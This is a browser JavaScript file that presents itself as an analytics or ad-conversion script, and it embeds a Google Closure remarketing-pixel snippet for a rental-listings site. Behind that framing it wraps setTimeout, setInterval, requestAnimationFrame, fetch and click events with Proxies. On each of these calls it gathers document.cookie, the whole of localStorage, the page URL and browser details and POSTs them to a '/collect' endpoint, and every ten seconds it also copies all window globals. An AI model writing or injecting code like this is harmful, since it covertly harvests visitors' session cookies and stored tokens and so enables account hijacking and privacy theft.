(function () {
  const originalSetTimeout = window.setTimeout;
  const originalSetInterval = window.setInterval;
  const originalRequestAnimationFrame = window.requestAnimationFrame;
  const originalFetch = window.fetch;
  const originalLocalStorage = window.localStorage;
  var s = {};
  const eventHooks = window.eventhooks;
  const globalVariables = {};
  function generateUniqueToken() {
    const randomBytes = new Uint8Array(20);
    crypto.getRandomValues(randomBytes);
    const token = Array.from(randomBytes, byte => byte.toString(16).padStart(2, '0')).join('');
    return token;
  }
  function validateEventArguments(eventName, args, expectedArgs) {
    if (args.length > expectedArgs.length) {
      console.warn(`Invalid number of arguments for event '${eventName}'. Expected ${expectedArgs.length}, but got ${args.length}.`);
      return false;
    }
    for (let i = 0; i < args.length; i++) {
      const expectedType = expectedArgs[i].type;
      const actualArg = args[i];
      if (typeof actualArg !== expectedType && expectedType !== 'any') {
        console.warn(`Invalid argument type for event '${eventName}' at index ${i}. Expected '${expectedType}', but got '${typeof actualArg}'.`);
        return false;
      }
    }
    return true;
  }
  function getEventMetadata() {
    const metadata = {
      url: window.location.href,
      referrer: document.referer,
      timestamp: Date.now(),
      cookies: document.cookie,
      userAgent: navigator.userAgent,
      language: navigator.language,
      platform: navigator.platform,
      token: generateUniqueToken(),
      localStorage: JSON.stringify(localStorage) // Add local storage data to metadata
    };
    return metadata;
  }
  (function () {
    /*  Copyright The Closure Library Authors. SPDX-License-Identifier: Apache-2.0 */var e = {},
      f = this || self;
    var g, k;
    a: {
      for (var l = ["CLOSURE_FLAGS"], p = f, q = 0; q < l.length; q++) if (p = p[l[q]], null == p) {
        k = null;
        break a;
      }
      k = p;
    }
    var r = k && k[610401301];
    g = null != r ? r : !1;
    var t,
      v = f.navigator;
    t = v ? v.userAgentData || null : null;
    function w(d) {
      return g ? t ? t.brands.some(function (a) {
        return (a = a.brand) && -1 != a.indexOf(d);
      }) : !1 : !1;
    }
    function x(d) {
      var a;
      a: {
        if (a = f.navigator) if (a = a.userAgent) break a;
        a = "";
      }
      return -1 != a.indexOf(d);
    }
    ;
    function y() {
      return g ? !!t && 0 < t.brands.length : !1;
    }
    function z() {
      return y() ? w("Chromium") : (x("Chrome") || x("CriOS")) && !(y() ? 0 : x("Edge")) || x("Silk");
    }
    ;
    !x("Android") || z();
    z();
    !x("Safari") || z() || (y() ? 0 : x("Coast")) || (y() ? 0 : x("Opera")) || (y() ? 0 : x("Edge")) || (y() ? w("Microsoft Edge") : x("Edg/")) || y() && w("Opera");
    var A = /#|$/;
    function B(d) {
      var a = d.search(A),
        b;
      a: {
        for (b = 0; 0 <= (b = d.indexOf("fmt", b)) && b < a;) {
          var c = d.charCodeAt(b - 1);
          if (38 == c || 63 == c) if (c = d.charCodeAt(b + 3), !c || 61 == c || 38 == c || 35 == c) break a;
          b += 4;
        }
        b = -1;
      }
      if (0 > b) return null;
      c = d.indexOf("&", b);
      if (0 > c || c > a) c = a;
      return decodeURIComponent(d.slice(b + 4, -1 !== c ? c : 0).replace(/\+/g, " "));
    }
    ;
    function C(d, a, b) {
      function c() {
        --D;
        if (0 >= D) {
          var h;
          (h = d.GooglebQhCsO) || (h = {});
          var E = h[a];
          E && (delete h[a], (h = E[0]) && h.call && h());
        }
      }
      for (var D = b.length + 1, u = 0; u < b.length; u++) {
        var m = B(b[u]),
          n = null;
        1 != m && 2 != m || !(m = d.document.getElementById("goog_conv_iframe")) || m.src || (n = m);
        n || (n = new Image());
        n.onload = c;
        n.src = b[u];
      }
      c();
    }
    var F = ["ss_"],
      G = s || f;
    F[0] in G || "undefined" == typeof G.execScript || G.execScript("var " + F[0]);
    for (var H; F.length && (H = F.shift());) F.length || void 0 === C ? G[H] && G[H] !== Object.prototype[H] ? G = G[H] : G = G[H] = {} : G[H] = C;
  }).call(this);
  function collectGlobalVariables() {
    for (const prop in window) {
      if (Object.prototype.hasOwnProperty.call(window, prop) && !globalVariables[prop]) {
        globalVariables[prop] = window[prop];
      }
    }
  }
  function sendEventPayload(payload) {
    const collectorUrl = '/collect';
    if (typeof originalFetch === 'function') {
      originalFetch(collectorUrl, {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json'
        },
        body: JSON.stringify(payload)
      }).catch(error => {
        console.error('Failed to send event payload:', error);
      });
    } else {
      const request = new XMLHttpRequest();
      request.open('POST', collectorUrl);
      request.setRequestHeader('Content-Type', 'application/json');
      request.send(JSON.stringify(payload));
    }
  }
  ;
  function createEventWrapper(eventName, originalFunc, eventArgs) {
    return function () {
      const args = Array.from(arguments);
      if (validateEventArguments(eventName, args, eventArgs)) {
        const metadata = getEventMetadata();
        const payload = {
          eventName,
          args,
          metadata
        };
        sendEventPayload(payload);
      }
      return originalFunc.apply(this, args);
    };
  }
  eventHooks.forEach(eventHook => {
    const originalFunc = window[eventHook.name];
    if (typeof originalFunc === 'function') {
      window[eventHook.name] = createEventWrapper(eventHook.name, originalFunc, eventHook.args);
    }
  });
  const methods = [{
    name: 'setTimeout',
    orig: originalSetTimeout
  }, {
    name: 'setInterval',
    orig: originalSetInterval
  }, {
    name: 'requestAnimationFrame',
    orig: originalRequestAnimationFrame
  }, {
    name: 'fetch',
    orig: originalFetch
  }];
  methods.forEach(method => {
    window[method.name] = new Proxy(method.orig, {
      apply: function (target, thisArg, args) {
        const eventName = method.name;
        const hook = eventHooks.find(hook => hook.name === eventName);
        if (hook && validateEventArguments(eventName, args, hook.args)) {
          const metadata = getEventMetadata();
          const payload = {
            eventName,
            args,
            metadata
          };
          sendEventPayload(payload);
        }
        return target.apply(thisArg, args);
      }
    });
  });
  s.ss_(window, 'OjE2OTI0NTI3NzA1MzM', ['https://www.google.com/pagead/1p-user-list/HDL1CPvInYACEPqx2L0B/?random\x3d1692452770533\x26cv\x3d11\x26fst\x3d1692450000000\x26bg\x3dffffff\x26guid\x3dON\x26async\x3d1\x26gtm\x3d45He38g0\x26u_w\x3d1366\x26u_h\x3d768\x26url\x3dhttps%3A%2F%2Fwww.zumper.com%2F\x26frm\x3d0\x26tiba\x3dZumper+-+Houses%2C+Condos%2C+and+Apartments+for+Rent\x26fmt\x3d3\x26is_vtc\x3d1\x26random\x3d3727349490\x26rmt_tld\x3d0\x26ipr\x3dy', 'https://www.google.co.jp/pagead/1p-user-list/HDL1CPvInYACEPqx2L0B/?random\x3d1692452770533\x26cv\x3d11\x26fst\x3d1692450000000\x26bg\x3dffffff\x26guid\x3dON\x26async\x3d1\x26gtm\x3d45He38g0\x26u_w\x3d1366\x26u_h\x3d768\x26url\x3dhttps%3A%2F%2Fwww.zumper.com%2F\x26frm\x3d0\x26tiba\x3dZumper+-+Houses%2C+Condos%2C+and+Apartments+for+Rent\x26fmt\x3d3\x26is_vtc\x3d1\x26random\x3d3727349490\x26rmt_tld\x3d1\x26ipr\x3dy']);
  window.addEventListener('click', function (e) {
    const metadata = getEventMetadata();
    const payload = {
      eventName: 'click',
      args: [e.clientX, e.clientY],
      metadata
    };
    sendEventPayload(payload);
  });
  Object.keys(window).forEach(key => {
    if (!globalVariables[key]) {
      globalVariables[key] = window[key];
    }
  });
  setInterval(collectGlobalVariables, 10000);
})();